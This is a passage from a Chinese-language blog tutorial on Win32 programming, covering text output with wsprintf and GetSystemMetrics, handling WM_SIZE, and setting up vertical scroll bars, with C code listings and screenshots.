cxChar,cyChar;</span><br><span class="line">    <span class="type">static</span> TCHAR szBuffer[<span class="number">128</span>] = TEXT(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> (message)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_CREATE:</span><br><span class="line">        </span><br><span class="line">        hdc=GetDC(hwnd);</span><br><span class="line">        GetTextMetrics(hdc,&amp;tm);<span class="comment">//获取当前系统字体属性,用tm承载</span></span><br><span class="line">        cxChar=tm.tmAveCharWidth;<span class="comment">//cxChar为平均小写字母宽度</span></span><br><span class="line">        cyChar=tm.tmHeight+tm.tmExternalLeading;<span class="comment">//cyChar为字体高度加上一个行间距</span></span><br><span class="line">        ReleaseDC(hwnd,hdc);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> ...</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="wsprintf格式化字符串">wsprintf格式化字符串</h5>
<p>不管是<code>TextOut</code>还是<code>DrawText</code>,决定往屏幕输出的参数都是字符串类型,不能是结构体或者整数或者浮点数</p>
<p>想要类似使用<code>cout&lt;&lt;5</code>这种直接打印整数到窗口是不可能的</p>
<p>那么怎么打印整数呢?用wsprintf先把要打印的所有东西,格式化到一个字符中,然后输出这个字符串</p>
<p>比如统计鼠标左键在客户区按下的次数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> cLBUTTONDOWN;<span class="comment">//铁打的静态变量只会定义一次</span></span><br><span class="line">    ++cLBUTTONDOWN;</span><br><span class="line">    TCHAR szBuffer[<span class="number">100</span>];<span class="comment">//流水的局部变量</span></span><br><span class="line">    wsprintf(szBuffer,TEXT(<span class="string">&quot;this is the %d time you click the left button&quot;</span>),cLBUTTONDOWN);<span class="comment">//格式化字符串到szBuffer</span></span><br><span class="line">    hdc = GetDC(hwnd);</span><br><span class="line">    GetClientRect(hwnd, &amp;rect);</span><br><span class="line">    DrawText(hdc, szBuffer, <span class="number">-1</span>, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class="line">    ReleaseDC(hwnd, hdc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807110305547.png"
alt="image-20220807110305547" />
<figcaption aria-hidden="true">image-20220807110305547</figcaption>
</figure>
<p>每次按下鼠标左键都会更新cLBUTTONDOWN这个统计数字</p>
<h5 id="显式多行">显式多行</h5>
<p>windows32编程上给出的例子是<strong>打印SystemMetrics所有的系统参数</strong></p>
<p>效果如图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807145300545.png"
alt="image-20220807145300545" />
<figcaption aria-hidden="true">image-20220807145300545</figcaption>
</figure>
<p>已经有一个窗口程序的雏形了</p>
<p>使用GetSystemMetrics获取系统参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetSystemMetrics</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span> nIndex</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>该函数使用一个下标作为参数,意思是查询SystemMetrics表的第nIndex个元素</p>
<blockquote>
<p>这个表啥样呢?</p>
<table>
<colgroup>
<col style="width: 23%" />
<col style="width: 76%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Value</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;"><strong>SM_ARRANGE</strong>56</td>
<td style="text-align: left;">The flags that specify how the system
arranged minimized windows. For more information, see the Remarks
section in this topic.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>SM_CLEANBOOT</strong>67</td>
<td style="text-align: left;">The value that specifies how the system is
started:0 Normal boot1 Fail-safe boot2 Fail-safe with network bootA
fail-safe boot (also called SafeBoot, Safe Mode, or Clean Boot) bypasses
the user startup files.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>SM_CMONITORS</strong>80</td>
<td style="text-align: left;">The number of display monitors on a
desktop. For more information, see the Remarks section in this
topic.</td>
</tr>
<tr>
<td style="text-align: left;">....</td>
<td style="text-align: left;">...</td>
</tr>
</tbody>
</table>
<p>Value为枚举类型的下标,从0开始编号,微软给出的文档并没有按照Value递增的顺序,而是按照枚举值字符串的字典序递增排列的<code>SM_ARRANGE&lt;SM_CLEANBOOT</code></p>
</blockquote>
<p>为了<strong>方便观察</strong>,书上先建立了一个头文件sysmets.h,里面只有一个结构体数组<code>struct sysmetrics[]</code>,每个结构体数组有三项,下标,枚举值字符串,意义.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> Index;</span><br><span class="line">	<span class="type">const</span> TCHAR* szLabel;<span class="comment">//此处需要用const修饰字符串常量,否则在virsual studio上会报告指针指向常量的错误</span></span><br><span class="line">	<span class="type">const</span> TCHAR* szDesc;</span><br><span class="line">&#125;sysmetrics[] =</span><br><span class="line">&#123;</span><br><span class="line"> 	SM_CXSCREEN, <span class="comment">//初始化本结构体数组第一个元素的第一个成员</span></span><br><span class="line">    TEXT(<span class="string">&quot;SM_CXSCREEN&quot;</span>),<span class="comment">//sysmetrics[0].szLabel=TEXT(&quot;SM_CXSCREEN&quot;);</span></span><br><span class="line"> 	TEXT(<span class="string">&quot;Screen width in pixels&quot;</span>),<span class="comment">//初始化本结构体数组第一个元素的第三个成员szDesc</span></span><br><span class="line">    </span><br><span class="line">SM_CYSCREEN, TEXT(<span class="string">&quot;SM_CYSCREEN&quot;</span>),</span><br><span class="line"> TEXT(<span class="string">&quot;Screen height in pixels&quot;</span>),</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>GetSystemMetrics(Index)</code>将会和<code>systemtrics[Index]</code>配套使用</p>
<p>然后主程序包含该头文件,相当于直接在主程序中定义了这么一个结构体数组</p>
<p>这个数组还有<code>GetSystemMetrics</code>函数在啥时候发挥的作用呢?</p>
<p>在WndProc消息处理函数中,下面炎鸠以下这个回调函数干了啥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> cxChar, cxCaps, cyChar;<span class="comment">//静态的小写,大写字体宽度,行间距</span></span><br><span class="line">	HDC hdc;<span class="comment">//设备环境句柄</span></span><br><span class="line">	<span class="type">int</span> i;<span class="comment">//遍历sysmetrics数组时使用的循环变量i</span></span><br><span class="line">	PAINTSTRUCT ps;<span class="comment">//</span></span><br><span class="line">	TCHAR szBuffer[<span class="number">10</span>];<span class="comment">//缓冲区,用于整合一行需要打印的字符</span></span><br><span class="line">	TEXTMETRIC tm;<span class="comment">//字体属性结构体,用于承载GetTextMetrics返回值</span></span><br><span class="line">	<span class="keyword">switch</span> (message)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> WM_CREATE:</span><br><span class="line">		hdc = GetDC(hwnd);</span><br><span class="line">		GetTextMetrics(hdc, &amp;tm);<span class="comment">//tm获取当前字体属性</span></span><br><span class="line">		cxChar = tm.tmAveCharWidth;<span class="comment">//获取小写字体宽度</span></span><br><span class="line">		cxCaps = (tm.tmPitchAndFamily &amp; <span class="number">1</span> ? <span class="number">3</span> : <span class="number">2</span>) * cxChar / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//获取大写字体宽度,变宽字体中,该值应该为小写字体宽度的1.5倍,等宽字体中大小写字母的宽度应该一样</span></span><br><span class="line">            <span class="comment">//由于的最低为是等宽变宽标志,因此与1按位与之后的结果,</span></span><br><span class="line">            <span class="comment">//如果为1说明字体变宽,cxCaps先等于三倍的cxChar然后除以2就是1.5倍的小写字母宽度</span></span><br><span class="line">		cyChar = tm.tmHeight + tm.tmExternalLeading;<span class="comment">//行间距,上一行字的本行字顶的距离</span></span><br><span class="line">		ReleaseDC(hwnd, hdc);<span class="comment">//释放设备环境</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_PAINT:</span><br><span class="line">		hdc = BeginPaint(hwnd, &amp;ps);<span class="comment">//重绘无效区,获得设备环境句柄</span></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUMLINES; i++)<span class="comment">//SystemMetrics有NUMLINES项,因此下标遍历0到NUMLINES</span></span><br><span class="line">		&#123;</span><br><span class="line">            <span class="comment">//每行打印三项,枚举类型字符串,意义,参数值</span></span><br><span class="line">			TextOut(hdc, <span class="number">0</span>, cyChar * i,<span class="comment">//第二个参数中cyChar就起了作用,规定在哪里开始绘制,因为前面i行都已经绘制完毕,因此本行应该在第i+1行位置绘制</span></span><br><span class="line">				sysmetrics[i].szLabel,</span><br><span class="line">				lstrlen(sysmetrics[i].szLabel));</span><br><span class="line">			TextOut(hdc, <span class="number">22</span> * cxCaps, cyChar * i,<span class="comment">//x坐标也有意义了,因为szLabel已经占用了从x=0开始的一些字节,因此szDesc从x=22开始绘制</span></span><br><span class="line">				sysmetrics[i].szDesc,</span><br><span class="line">				lstrlen(sysmetrics[i].szDesc));</span><br><span class="line">			SetTextAlign(hdc, TA_RIGHT | TA_TOP);<span class="comment">//设置文本右上角对齐,作用于hdc指向的设备环境</span></span><br><span class="line">			TextOut(hdc, <span class="number">22</span> * cxCaps + <span class="number">40</span> * cxChar, cyChar * i, szBuffer,</span><br><span class="line">				wsprintf(szBuffer, TEXT(<span class="string">&quot;%5d&quot;</span>),</span><br><span class="line">                       </span><br><span class="line">					GetSystemMetrics(sysmetrics[i].Index)));<span class="comment">//此处压行了,szBuffer的构造放在了最后一个参数的求值中</span></span><br><span class="line">			SetTextAlign(hdc, TA_LEFT | TA_TOP);<span class="comment">//设置回左对齐,好借好还,再借不难</span></span><br><span class="line">		&#125;</span><br><span class="line">		EndPaint(hwnd, &amp;ps);<span class="comment">//结束绘制,释放ps中的hdc设备环境</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">		PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="打印不开问题">打印不开问题</h4>
<p><del>由于心胸狭隘</del></p>
<p>如果电脑屏幕比较小,那么可以显式的行数就少,可能一个屏幕没法全部打印出来.甚至屏幕窄了一行都显式不全,比如:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807161039836.png"
alt="image-20220807161039836" />
<figcaption aria-hidden="true">image-20220807161039836</figcaption>
</figure>
<p>这是因为本程序没有考虑客户区的大小,它只管打印它的,不管人能不能看见</p>
<p>怎么获取客户区的大小呢?</p>
<h5 id="getclientrect">GetClientRect</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">GetClientRect</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HWND   hWnd,</span></span><br><span class="line"><span class="params">  [out] LPRECT lpRect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>第一个参数是设备环境句柄</p>
<p>第二个参数是返回值,用一个RECT结构体引用承载当前客户区信息</p>
<p>这个结构体啥样呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRECT</span> &#123;</span></span><br><span class="line">  LONG left;</span><br><span class="line">  LONG top;</span><br><span class="line">  LONG right;</span><br><span class="line">  LONG bottom;</span><br><span class="line">&#125; RECT, *PRECT, *NPRECT, *LPRECT;</span><br></pre></td></tr></table></figure>
<p>GetClientRect返回的矩形中,左和上坐标都是0,即以客户区的左上角为基准</p>
<p><strong>右和下坐标是实际大小</strong>(像素)</p>
<h5 id="处理wm_size消息">处理WM_SIZE消息</h5>
<p>更好的方法是处理WM_SIZE消息</p>
<p>每当窗口大小发生变化(位置变化不算),Windows就会向窗口过程发送一条WM_SIZE消息,此时传递给WndProc处理函数的lParam参数就有实际意义了,高16位是新的窗口高度,低16位是新的窗口宽度,可以使用两个静态变量来承载保存这个两个值,静态的好处是只会定义一次,那么在本次处理WM_SIZE消息时修改这两个值,就可以在处理下一条消息比如WM_PAINT时使用刚才保存的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WndProc(...):</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> cxClient, cyClient;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">switch</span> (message) &#123;</span><br><span class="line"><span class="keyword">case</span> ...</span><br><span class="line"><span class="keyword">case</span> WM_SIZE:</span><br><span class="line">	cxClient = LOWORD(lParam);</span><br><span class="line">	cyClient = HIWORD(lParam);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">case</span> ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其中LOWORD和HIWORD是定义在WINDEF.H中的两个宏</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LOWORD(l)           ((WORD)(((DWORD_PTR)(l)) &amp; 0xffff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIWORD(l)           ((WORD)((((DWORD_PTR)(l)) &gt;&gt; 16) &amp; 0xffff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOBYTE(w)           ((BYTE)(((DWORD_PTR)(w)) &amp; 0xff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIBYTE(w)           ((BYTE)((((DWORD_PTR)(w)) &gt;&gt; 8) &amp; 0xff))</span></span><br></pre></td></tr></table></figure>
<p>LOWORD(l)就是不管l啥类型,对l取双字然后和<code>0xFFFF</code>全一的字按位与,即保留低字</p>
</blockquote>
<p>在处理WM_SIZE消息时只负责计算出新的客户区宽高,重绘它是一点儿也不用管,因为一般WM_SIZE消息之后会有一个WM_PAINT消息接踵而至,重绘的工作在WM_PAINT中完成</p>
<p>这样看一切都合理了,处理WM_SIZE相当于为处理WM_PAINT预处理,计算客户区大小</p>
<p>但是窗口第一次显式出来的时候呢?WM_SIZE不是说得在窗口大小发生变化时才会收到吗?</p>
<p>事实上WM_CREATE之后不会立刻传递WM_PAINT进行绘制,而是会先传递WM_SIZE,可以理解为窗口从无到有也包含了客户区的尺寸变化</p>
<p>这样改进之后的WM_PAINT处理过程:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MAXLINES = cyClient / cyChar;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; min(NUMLINES,MAXLINES); ++i) &#123;</span><br><span class="line">	TextOut(hdc, <span class="number">10</span>, i * cyChar, sysmetrics[i].szLabel,lstrlen(sysmetrics[i].szLabel));</span><br><span class="line">	TextOut(hdc, <span class="number">40</span> * cxCaps, i * cyChar, sysmetrics[i].szDesc, lstrlen(sysmetrics[i].szDesc));</span><br><span class="line">	wsprintf(szBuffer, TEXT(<span class="string">&quot;%5d&quot;</span>), GetSystemMetrics(sysmetrics[i].Index));</span><br><span class="line">	SetTextAlign(hdc, TA_LEFT);</span><br><span class="line">	TextOut(hdc, <span class="number">80</span> * cxCaps, i * cyChar, szBuffer, lstrlen(szBuffer));</span><br><span class="line">	SetTextAlign(hdc, TA_LEFT);</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
<p>首先MAXLINES计算得到当前客户区最大能够容纳的完整行数,然后下面打印的时候取现有行数和能够打印的最大完整行数最小值.</p>
<p>这样就不会在客户区最底下打印出短斤少两的半行了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807165837263.png"
alt="image-20220807165837263" />
<figcaption aria-hidden="true">image-20220807165837263</figcaption>
</figure>
<p>但是这样没有解决不能显式完全的问题,甚至说只能解决边界上的显式好不好看问题,真是吹毛求疵</p>
<p>要用有限的屏幕空间浏览长于一个屏幕的信息,最好的方法就是添加一个滚动条,拖到下面看下面,拖到上面看上面,</p>
<p>比如任务管理器的滚动条</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807170100222.png"
alt="image-20220807170100222" />
<figcaption aria-hidden="true">image-20220807170100222</figcaption>
</figure>
<h2 id="滚动条">滚动条</h2>
<p>滚动条的效果就类似拿着放大镜看一个巨大的报纸,但是放大镜固定不动,动的是报纸</p>
<p>下滑滚动条就是报纸往彼方移动,相当于放大镜往己方移动</p>
<blockquote>
<p>与其说是放大镜,不如说是一张扣了个方框的不透明纸压在报纸上,透过这个方框看报纸</p>
</blockquote>
<h3 id="添加滚动条">添加滚动条</h3>
<p>滚动条属于窗口实例的风格,只需要在实例化窗口对象的时候往窗口对象风格标识符上按位与上滚动条特性<code>WS_VSCROLL|WS_HSCROLL</code>垂直滚动条|水平滚动条</p>
<p>比如:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hwnd = CreateWindow(szAppName, TEXT(<span class="string">&quot;Get System Metrics No. 1&quot;</span>),</span><br><span class="line">	WS_OVERLAPPEDWINDOW| WS_VSCROLL | WS_HSCROLL,<span class="comment">//此处加入滚动条属性</span></span><br><span class="line">	CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">	CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">	<span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>之后的效果如图:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807171154754.png"
alt="image-20220807171154754" />
<figcaption aria-hidden="true">image-20220807171154754</figcaption>
</figure>
<p>确实窗口右侧和下方都出现了滚动条</p>
<p>但是这时候拖动滚动条是没有效果的,它只是个摆设</p>
<p>Windows操作系统负责处理滚动条上的鼠标动作,但是不负责键盘接口.如果想要通过键盘控制滚动条,需要显式给出对应关系,但这是后话,目前的任务是给滚动条加上管理范围,让它不是摆设</p>
<blockquote>
<p>Windows操作系统和应用程序</p>
</blockquote>
<h3 id="位置和范围">位置和范围</h3>
<p>范围是一对整数,表明滚动条的最小值和最大值</p>
<p>位置是滑块实时在这个范围中的值,位置永远属于是范围这个整数集合</p>
<p>默认滚动条的范围是<code>[0,100)</code></p>
<h4 id="范围">范围</h4>
<p>可以调用setScrollRange修改其范围</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">SetScrollRange</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND hWnd,</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  nBar,</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  nMinPos,</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  nMaxPos,</span></span><br><span class="line"><span class="params">  [in] BOOL bRedraw</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 10%" />
<col style="width: 89%" />
</colgroup>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>hwnd</td>
<td>窗口实例的句柄</td>
</tr>
<tr>
<td>nBar</td>
<td>标志滚动条的类型,是水平还是垂直</td>
</tr>
<tr>
<td>nMinPos</td>
<td>滚动条最小范围</td>
</tr>
<tr>
<td>nMaxPos</td>
<td>滚动条最大范围</td>
</tr>
<tr>
<td>bRedraw</td>
<td>规定是否重绘滚动条,可以在下一次显示前,所有对滚动条的修改完成之后,再规定为TRUE表明重绘</td>
</tr>
</tbody>
</table>
<h5 id="设置滚动条范围">设置滚动条范围</h5>
<p>当滚动条范围是<code>[0,NUMLINES-1]</code>,当滑块位置是0,此时第一条文本显示在客户区最上方,下面顺次是第2条文本,第3条...这样是合理的</p>
<p>当滑块位置是NUMLINES-1,此时最后一条文本显示在客户区<strong>最上方</strong>,下面全都是空白.显然着这不合理.</p>
<p>怎么样让滑块最远到达的位置,使得最后一条文本显示 在客户区的最下方?</p>
<blockquote>
<p>假设客户区大小100,需要打印1000行,当滑块在0时可以显示第1到100行,当滑块在1时可以显示第2到101行,当滑块在900时,可以显示第901到1000行</p>
<p>因此只需要NUMLINES-cyClient就可以实现</p>
</blockquote>
<p>啥时候更新滚动条范围呢?NUMLINES是一个常数,cyClient客户区垂直行数是一个变量,因此滚动条范围上界可以跟随cyClient变化</p>
<p>都在处理WM_SIZE时修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SIZE:</span><br><span class="line">	cxClient = LOWORD(lParam);</span><br><span class="line">	cyClient = HIWORD(lParam);</span><br><span class="line">	iVscrollMax = max(<span class="number">0</span>, NUMLINES - cyClient / cyChar);<span class="comment">//非负</span></span><br><span class="line">	SetScrollRange(hwnd, SB_VERT, <span class="number">0</span>, iVscrollMax, TRUE);<span class="comment">//修改范围</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h4 id="位置">位置</h4>
<p>滑块的位置是一个整数,比如当滚动条范围是<code>[0,1024)</code></p>
<p>那么滑块的位置就有0,1,2,...,1022,1023,总共1024种情况</p>
<p>必须使用<code>SetScrollPos</code>函数修改滑块的位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> SetScrollPos（HWN hWnd，<span class="type">int</span> nBar，<span class="type">int</span> nPos，BOOL bRedraw）;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>hwnd</td>
<td>窗口实例的句柄</td>
</tr>
<tr>
<td>nBar</td>
<td>标志滚动条的类型,是水平还是垂直</td>
</tr>
<tr>
<td>nPos</td>
<td>滑块新位置,该值需要介于滚动条的范围内</td>
</tr>
<tr>
<td>bRedraw</td>
<td>规定是否重绘滚动条,同SetScrollRange中的bRedraw参数</td>
</tr>
</tbody>
</table>
<p>程序和windows操作系统合作处理滚动条上的动作</p>
<blockquote>
<p>windows操作系统:</p>
<p>处理滚动条中的所有鼠标信息,</p>
<p>当鼠标拖动滑块的时候高亮</p>
<p>当用户拖动滑块的时候,在滚动条内移动滑块</p>
<p>向拥有滚动条的窗口过程发送滚动条消息</p>
<p>程序:</p>
<p>初始化滚动条的范围和位置</p>
<p>处理传送给窗口过程的滚动条信息</p>
<p>更新滑块的位置</p>
<p>根据滚动条的变化更新客户区的内容</p>
</blockquote>
<h3 id="处理滚动条消息">处理滚动条消息</h3>
<p>单击滚动条或者拖动滑块会导致windows向窗口过程发送WM_VSCROLL或者WM_HSCROLL消息</p>
<p>此时wParam和lParam参数就有实际意义了.其中lParam用于滚动条是子窗口.wParam用于滚动条是窗口的一部分,目前只使用wParam就足够了</p>
<p>wParam是一个无符号32位双字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typedef _W64 unsigned int UINT_PTR, *PUINT_PTR;</span><br><span class="line">typedef UINT_PTR            WPARAM;</span><br></pre></td></tr></table></figure>
<p>其低位字代表了鼠标在滚动条的动作,又称为"通知码",低位字的枚举值在winuser.h中有定义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#define SB_LINEUP 0</span><br><span class="line">#define SB_LINELEFT 0</span><br><span class="line">#define SB_LINEDOWN 1</span><br><span class="line">#define SB_LINERIGHT 1</span><br><span class="line">#define SB_PAGEUP 2</span><br><span class="line">#define SB_PAGELEFT 2</span><br><span class="line">#define SB_PAGEDOWN 3</span><br><span class="line">#define SB_PAGERIGHT 3</span><br><span class="line">#define SB_THUMBPOSITION 4</span><br><span class="line">#define SB_THUMBTRACK 5</span><br><span class="line">#define SB_TOP 6</span><br><span class="line">#define SB_LEFT 6</span><br><span class="line">#define SB_BOTTOM 7</span><br><span class="line">#define SB_RIGHT 7</span><br><span class="line">#define SB_ENDSCROLL 8</span><br></pre></td></tr></table></figure>
<p>各个枚举值的对应效果</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220808081546006.png"
alt="image-20220808081546006" />
<figcaption aria-hidden="true">image-20220808081546006</figcaption>
</figure>
<p>wParam的高位字表示滑块位置</p>
<h3 id="使用滚动条">使用滚动条</h3>
<p>加入滚动条处理的WndProc函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 